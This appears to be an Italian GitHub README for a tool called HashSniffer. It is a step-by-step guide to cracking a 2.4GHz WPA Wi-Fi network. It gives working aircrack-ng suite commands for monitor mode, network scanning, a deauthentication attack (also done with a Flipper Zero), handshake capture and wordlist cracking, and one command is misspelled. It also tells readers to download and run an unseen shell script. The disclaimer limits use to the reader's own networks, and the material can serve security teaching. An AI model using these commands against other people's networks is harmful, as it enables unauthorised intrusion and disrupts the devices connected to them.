# Page 1

Il nostro progetto è stato quello di evidenziare le vulnerabilità di una rete wifi comune a 2.4GHz. Questo progetto nasce solo ed esclusivamente a scopo informativo e vi invitiamo a replicare il progetto con reti create da voi per verificarne le vulnerabilità.

Per seguire questa semplificare i vari comandi di testing, abbiamo creato un tool da eseguire in shell linux. Nella guida troverete sia come usare il tool che i comandi da eseguire manualmente. Ricordiamo inoltre che il tool è completamente source code.

## $${\color{aqua}Automated \space script}$$

Iniziamo scaricando la repository in locale:

```bash
$ git clone https://github.com/callmenoway/HashSniffer.git
$ cd HashSniffer
```

Successivamente eseguiamo il tool:

```bash
$ chmod +x hashsniffer.sh
$ ./hashsniffer.sh
```

## $${\color{green}Guida \space manuale}$$

Per iniziare ci servirà un OS Linux con scaricato il tool [Aircrack-ng](https://www.aircrack-ng.org/). Possibilmente usate come distro Kali in quanto preinstallato. Iniziamo aprendo un terminale e seguendo i seguenti comandi:


```bash
┌(root💀kali)-[~]
│
┕$ iwconfig
```

<div align="center">

<img src="img/1.png" alt="">

</div>

Una volta eseguito il comando ci usciranno tutte le schede internet che possediamo sulla macchina. Per iniziare creiamo una scheda parallela virtuale per iniziare il listening delle reti:


```bash
┌(root💀kali)-[~]
│
┕$ sudo airomon-ng start <YOURE WIRELESS EXTENSION>
```

<div align="center">

<img src="img/2.png" alt="">

</div>

Successivamente per visualizzare tutte le reti disponibili:


```bash
┌(root💀kali)-[~]
│
┕$ sudo airodump-ng wlan0mon
```

\


<div align="center">

<img src="img/4.png" alt="">

</div>

Tra i risultati dobbiamo copiare il BSSID della rete in questione ed eseguire il comando:

```bash
┌(root💀kali)-[~]
│
┕$ sudo airodump-ng -canale -w NomeFile -d BSSID wlan0mon
```

In questo modo stiamo verificando solo la rete in questione.

## $${\color{green}Deauth \space \color{red} Attack}$$

Una volta che siamo in listening wifi possiamo procedere con il [Deauth Attack](https://en.wikipedia.org/wiki/Wi-Fi\_deauthentication\_attack) (Oggi useremo il Flipper Zero ma ci sono altre alternative come ESP32 Marauder ecc...). Iniziamo facendo una scansione delle reti, selezioniamo la rete in questione e iniziamo l'attacco.

Deauth attack con Flipper Zero:

<div align="center">

<img src="img/flipper.jpg" alt="" width="300">

</div>

Attacco deauth integrato tramite il comando:


```bash
┌(root💀kali)-[~]
│
┕$ sudo aireplay-ng --deauth 0 -a BSSID -c STATION wlan0mon
```

<div align="center">

<img src="img/5.png" alt="">

</div>

## $${\color{white}WPA \space \color{green}handshake \space \color{red}decrypt}$$

Una volta effettuato l'attacco sul terminale linux dovremo trovare un WPA handshake. Se non compare continuiamo l'attacco in modo che il dispositivo si ricolleghi. Una volta trovato il WPA handshake nella cartella locale troveremo dei file "NomeFile" che contengono tutte le informazioni che ci servono sulla rete. Per eseguire la decriptazione della password del wifi necessitiamo di un file che contenga molte password da provare sul file criptato. Per iniziare la decriptazione:


```bash
┌(root💀kali)-[~]
│
┕$ sudo aircrack-ng NomeFile-01.cap -w Password.txt 
```

<div align="center">

<img src="img/6.png" alt="">

</div>

Il tempo di decriptazione può variare in base alla difficoltà della password e dalla lista che viene usata.

## $${\color{orange}Tools}$$

[Flipper Zero](https://flipperzero.one/) accoppiato con [ESP32](https://en.wikipedia.org/wiki/ESP32).\
Deauther fai da te: [Marauder](https://github.com/justcallmekoko/ESP32Marauder).\
Tool usato per condividere lo schermo in rete locale [Live-ScreenShare](https://github.com/callmenoway/Live-ScreenShare)
